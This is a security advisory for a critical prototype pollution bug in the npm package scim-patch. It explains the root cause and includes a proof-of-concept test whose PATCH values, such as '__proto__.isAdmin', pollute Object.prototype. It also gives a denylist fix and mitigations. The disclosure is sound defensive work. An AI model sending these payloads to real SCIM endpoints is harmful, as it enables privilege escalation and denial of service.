# [C] scimPatch vulnerable to prototype pollution via unfiltered keys in patch

## Summary
Severity: Critical
Advisory: GHSA-9m6g-wc8r-q59c
CVE: CVE-2026-48170
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:L (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-9m6g-wc8r-q59c
Type: github-advisory

## Affected
- npm: `scim-patch` — affected >=0 <0.9.1

## Details
## Summary

`scim-patch` performs prototype pollution when applying a SCIM PATCH operation whose `value` object contains a key like `"__proto__.someProp"`. After one such patch,
`Object.prototype.someProp` is set process-wide, affecting every plain object in the Node process.

Any service that calls `scimPatch()` on attacker-controlled JSON (i.e. any SCIM endpoint accepting `PATCH` from an external IdP) is exploitable on a stock Node runtime.

## Impact

- **Class:** Prototype pollution ([CWE-1321](https://cwe.mitre.org/data/definitions/1321.html))
- **Affected versions:** `<= 0.9.0` (current HEAD `871b1e2`)
- **Attack vector:** Network — sent as part of a normal SCIM `PATCH /Users/:id` request body.
- **Privileges required:** Whatever the SCIM endpoint requires. For most integrations that's a provisioned IdP, which is "low" in CVSS terms (any authenticated provisioning client).
- **Scope:** Changed — the bug is in a SCIM library but the side effect (`Object.prototype` mutation) leaks into the entire Node process.

Downstream consequences depend on what other code reads from plain objects. Realistic outcomes observed in similar bugs:
- **Privilege escalation** if any auth/middleware code checks `actor.isAdmin` / `req.user.admin` / similar boolean flags against a plain object that *expects* the key to be absent.
- **Logic bypass / DoS** if any code branches on `obj.name`, `obj.type`, `obj.id` etc. against plain objects (e.g. `pg`'s prepared-statement naming check — a real incident at one consumer).
- **Persistence:** lasts until the Node process restarts, so the blast radius is *every* request that container handles after the pollution.

## Root cause

In `src/scimPatch.ts:415-427`, `addOrReplaceObjectAttribute` iterates the user-supplied `patch.value` with `Object.entries` and feeds each key to `resolvePaths`, which splits on `.`:

```ts
function addOrReplaceObjectAttribute(property: any, patch: ScimPatchAddReplaceOperation, multiValuedPathFilter?: boolean): any {
    if (typeof patch.value !== 'object') { ... }

    // src/scimPatch.ts:423-427
    for (const [key, value] of Object.entries(patch.value)) {
        assign(property, resolvePaths(key), value, patch.op);
    }
    return property;
}
```

`assign` then walks the resulting key path with no filtering on dangerous keys (`src/scimPatch.ts:437-445`):

```ts
function assign(obj: any, keyPath: Array<string>, value: any, op: string) {
    const lastKeyIndex = keyPath.length - 1;
    for (let i = 0; i < lastKeyIndex; ++i) {
        const key = keyPath[i];
        if (!(key in obj)) {
            obj[key] = {};
        }
        obj = obj[key];   // ← obj["__proto__"] === Object.prototype
    }
    // ... assigns into Object.prototype
}
```

For `keyPath = ["__proto__", "polluted"]`:
- `"__proto__" in obj` is always true, so the fresh-object branch is skipped.
- `obj = obj["__proto__"]` now points to `Object.prototype`.
- The final write lands on `Object.prototype.polluted`.

The same shape works for `constructor.prototype` keys.

## Proof of concept

Drop this in `test/prototypePollution.test.ts` and run `npm run build && npx mocha lib/test/prototypePollution.test.js`. Both tests pass against HEAD `871b1e2`:

```ts
import { scimPatch } from '../src/scimPatch';
import { ScimUser } from './types/types.test';
import { expect } from 'chai';

describe('Prototype pollution via scim-patch', () => {
    let scimUser: ScimUser;

    beforeEach(() => {
        scimUser = JSON.parse(`{
          "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
          "id": "tea_4",
          "userName": "spiderman",
          "name": { "familyName": "Parker", "givenName": "Peter" },
          "active": true,
          "emails": [{ "value": "spiderman@superheroes.com", "primary": true }],
          "roles": [],
          "meta": { "resourceType": "User", "created": "x", "lastModified": "x", "location": "x" }
        }`);
    });

    afterEach(() => {
        delete (Object.prototype as any).polluted;
        delete (Object.prototype as any).isAdmin;
    });

    it('pollutes Object.prototype via a value-key containing __proto__', () => {
        expect(({} as any).polluted).to.equal(undefined);

        scimPatch(scimUser, [{
            op: 'add',
            path: 'name',
            value: { '__proto__.polluted': 'yes' }
        }]);

        expect((Object.prototype as any).polluted).to.equal('yes');
        expect(({} as any).polluted).to.equal('yes');
    });

    it('elevates Object.prototype.isAdmin — the admin-escalation shape', () => {
        expect(({} as any).isAdmin).to.equal(undefined);

        scimPatch(scimUser, [{
            op: 'add',
            path: 'name',
            value: { '__proto__.isAdmin': true }
        }]);

        expect((Object.prototype as any).isAdmin).to.equal(true);
        expect(({} as any).isAdmin).to.equal(true);
    });
});
```

## Suggested fix

Reject the three dangerous keys in `assign()` before the walk. Minimal patch:

```ts
const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function assign(obj: any, keyPath: Array<string>, value: any, op: string) {
    for (const key of keyPath) {
        if (DANGEROUS_KEYS.has(key)) {
            throw new InvalidScimPatchOp(`Forbidden key in patch path: ${key}`);
        }
    }
    // ... existing logic
}
```

Alternative, slightly safer: switch the walk target to `Object.create(null)` nodes when creating intermediate objects, and use `Object.defineProperty(obj, key, { value, enumerable: true, configurable: true, writable: true })` instead of `obj[key] = value` for the final write. That defends against future prototype-walking sinks even if a key sneaks past the denylist.

Either approach is a non-breaking change — legitimate SCIM clients never send these keys.

## Mitigation for consumers who can't upgrade immediately

Calling `Object.freeze(Object.prototype)` (and the same on `Array.prototype`, `Function.prototype`) at process startup neutralizes this class of bug — assignment to a frozen prototype becomes a silent no-op in sloppy mode or a `TypeError` in strict mode. Node's `--frozen-intrinsics` flag does this for built-ins automatically.

## Credit

Discovered by **Lee Wang (Notion)**. Reported by **David Wu (Notion)**.

Report authored by **Claude**. Reviewed by **David Wu**.

## References
- https://github.com/thomaspoignant/scim-patch/security/advisories/GHSA-9m6g-wc8r-q59c
- https://github.com/thomaspoignant/scim-patch/commit/260f9cd2ac5ceac3976978850bb47dcb391720f6
- https://github.com/thomaspoignant/scim-patch
